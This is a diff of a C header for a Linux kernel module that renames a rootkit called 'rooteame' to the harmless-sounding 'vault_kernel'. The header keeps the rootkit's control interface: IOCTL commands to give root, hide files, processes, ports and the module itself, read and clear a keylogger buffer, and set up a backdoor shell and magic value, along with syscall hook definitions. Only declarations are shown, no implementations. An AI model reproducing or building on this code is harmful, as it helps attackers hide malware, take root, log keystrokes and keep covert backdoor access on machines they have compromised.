@@ -1,5 +1,5 @@
-#ifndef _ROOTEAME_CORE_H
-#define _ROOTEAME_CORE_H
+#ifndef _VAULT_KERNEL_CORE_H
+#define _VAULT_KERNEL_CORE_H
 
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -42,13 +42,13 @@
 #include <asm/unistd.h>
 
 /* -- Module metadata -- */
-#define ROOTEAME_NAME    "rooteame"
-#define ROOTEAME_VERSION "3.0"
-#define ROOTEAME_AUTHOR  "ruby570bocadito"
-#define ROOTEAME_TAG     "[rooteame]"
+#define VAULT_KERNEL_NAME    "vault_kernel"
+#define VAULT_KERNEL_VERSION "3.0"
+#define VAULT_KERNEL_AUTHOR  "ruby570bocadito"
+#define VAULT_KERNEL_TAG     "[vault_kernel]"
 
-#define DEVICE_NAME      "rooteame"
-#define CLASS_NAME       "rooteame"
+#define DEVICE_NAME      "vault_kernel"
+#define CLASS_NAME       "vault_kernel"
 
 /* -- Syscall hook definitions -- */
 #define MAX_HOOKS        12
@@ -58,22 +58,22 @@
 #define MAX_KEYLOG_BUF   4096
 
 /* -- IOCTL commands -- */
-#define ROOTEAME_MAGIC 0xC0
+#define VAULT_KERNEL_MAGIC 0xC0
 
-#define IOCTL_GIVE_ROOT        _IO(ROOTEAME_MAGIC, 0x01)
-#define IOCTL_HIDE_FILE        _IOW(ROOTEAME_MAGIC, 0x02, char[256])
-#define IOCTL_UNHIDE_FILE      _IOW(ROOTEAME_MAGIC, 0x03, char[256])
-#define IOCTL_HIDE_PID         _IOW(ROOTEAME_MAGIC, 0x04, int)
-#define IOCTL_UNHIDE_PID       _IOW(ROOTEAME_MAGIC, 0x05, int)
-#define IOCTL_HIDE_PORT        _IOW(ROOTEAME_MAGIC, 0x06, uint16_t)
-#define IOCTL_UNHIDE_PORT      _IOW(ROOTEAME_MAGIC, 0x07, uint16_t)
-#define IOCTL_LIST_HIDDEN      _IOR(ROOTEAME_MAGIC, 0x08, char[4096])
-#define IOCTL_KEYLOG_READ      _IOR(ROOTEAME_MAGIC, 0x09, char[4096])
-#define IOCTL_KEYLOG_CLEAR     _IO(ROOTEAME_MAGIC, 0x0A)
-#define IOCTL_BACKDOOR_SHELL   _IOW(ROOTEAME_MAGIC, 0x0B, char[256])
-#define IOCTL_BACKDOOR_MAGIC   _IOW(ROOTEAME_MAGIC, 0x0C, char[16])
-#define IOCTL_MODULE_HIDE      _IO(ROOTEAME_MAGIC, 0x0D)
-#define IOCTL_MODULE_UNHIDE    _IO(ROOTEAME_MAGIC, 0x0E)
+#define IOCTL_GIVE_ROOT        _IO(VAULT_KERNEL_MAGIC, 0x01)
+#define IOCTL_HIDE_FILE        _IOW(VAULT_KERNEL_MAGIC, 0x02, char[256])
+#define IOCTL_UNHIDE_FILE      _IOW(VAULT_KERNEL_MAGIC, 0x03, char[256])
+#define IOCTL_HIDE_PID         _IOW(VAULT_KERNEL_MAGIC, 0x04, int)
+#define IOCTL_UNHIDE_PID       _IOW(VAULT_KERNEL_MAGIC, 0x05, int)
+#define IOCTL_HIDE_PORT        _IOW(VAULT_KERNEL_MAGIC, 0x06, uint16_t)
+#define IOCTL_UNHIDE_PORT      _IOW(VAULT_KERNEL_MAGIC, 0x07, uint16_t)
+#define IOCTL_LIST_HIDDEN      _IOR(VAULT_KERNEL_MAGIC, 0x08, char[4096])
+#define IOCTL_KEYLOG_READ      _IOR(VAULT_KERNEL_MAGIC, 0x09, char[4096])
+#define IOCTL_KEYLOG_CLEAR     _IO(VAULT_KERNEL_MAGIC, 0x0A)
+#define IOCTL_BACKDOOR_SHELL   _IOW(VAULT_KERNEL_MAGIC, 0x0B, char[256])
+#define IOCTL_BACKDOOR_MAGIC   _IOW(VAULT_KERNEL_MAGIC, 0x0C, char[16])
+#define IOCTL_MODULE_HIDE      _IO(VAULT_KERNEL_MAGIC, 0x0D)
+#define IOCTL_MODULE_UNHIDE    _IO(VAULT_KERNEL_MAGIC, 0x0E)
 
 /* -- Hooked syscall entry -- */
 struct hooked_syscall {
@@ -181,4 +181,4 @@ int stealth_unhide_module(void);
 int ioctl_init(void);
 void ioctl_cleanup(void);
 
-#endif /* _ROOTEAME_CORE_H */
+#endif /* _VAULT_KERNEL_CORE_H */
